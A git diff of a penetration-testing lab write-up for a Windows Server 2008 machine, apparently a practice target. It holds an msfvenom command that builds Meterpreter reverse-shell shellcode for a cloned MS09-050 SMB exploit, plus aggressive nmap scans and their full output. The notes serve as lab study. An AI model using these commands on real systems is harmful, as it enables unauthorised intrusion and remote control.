@@ -66,7 +66,7 @@ git clone https://github.com/Sic4rio/CVE-2009-3103---srv2.sys-SMB-Code-Execution
 cp MS09-050.py edit-MS09-050.py
 mousepad edit-MS09-050.py
 
-msfvemon -p windows/meterpreter/reverse_tcp LHOST=192.168.45.208 LPORT=4444 EXITFUNC=thread -f python -v shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f python -v shell
 
 chmod u+x edit-MS09-050.py
 
@@ -74,3 +74,78 @@ chmod u+x edit-MS09-050.py
 ```
 
 **I need to better understand each protocol and how different combinations of each can lead to potential compromise. **
+
+---
+
+### Revisiting machine
+
+Commands ran hopefully to help streamline the process
+```
+nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA Full-Ports-Scan -vvv --open 192.168.205.40
+
+cat Full-Ports-Scan.nmap| awk '/^Nmap scan report/{ip=$NF} /(\/tcp|\/udp)/ && /open/{split($1,p,"/"); print ip ":" p[1]}' | sort -u > discovery_scan_ip_ports.txt
+
+cat discovery_scan_ip_ports.txt | cut -d: -f2 | sort -u > only-ports-list.txt
+
+nmap -Pn -sV -sC --open -p "$(paste -sd, only-ports-list.txt)" 192.168.205.40 -oA detailed-ports-results
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| ssl-cert: Subject: commonName=internal
+| Not valid before: 2025-03-04T23:44:47
+|_Not valid after:  2025-09-03T23:44:47
+| rdp-ntlm-info: 
+|   Target_Name: INTERNAL
+|   NetBIOS_Domain_Name: INTERNAL
+|   NetBIOS_Computer_Name: INTERNAL
+|   DNS_Domain_Name: internal
+|   DNS_Computer_Name: internal
+|   Product_Version: 6.0.6001
+|_  System_Time: 2026-07-20T23:21:47+00:00
+|_ssl-date: 2026-07-20T23:21:55+00:00; 0s from scanner time.
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49156/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
+
+Host script results:
+| smb2-security-mode: 
+|   2.0.2: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: internal
+|   NetBIOS computer name: INTERNAL\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-07-20T16:21:47-07:00
+| smb2-time: 
+|   date: 2026-07-20T23:21:47
+|_  start_date: 2025-03-05T23:44:46
+|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:43:6f (VMware)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
+```
+When we get machine information from rdp it is worth adding the target to the `etc/hosts` file.
+```
+sudo mousepad /etc/hosts
+
+
+```
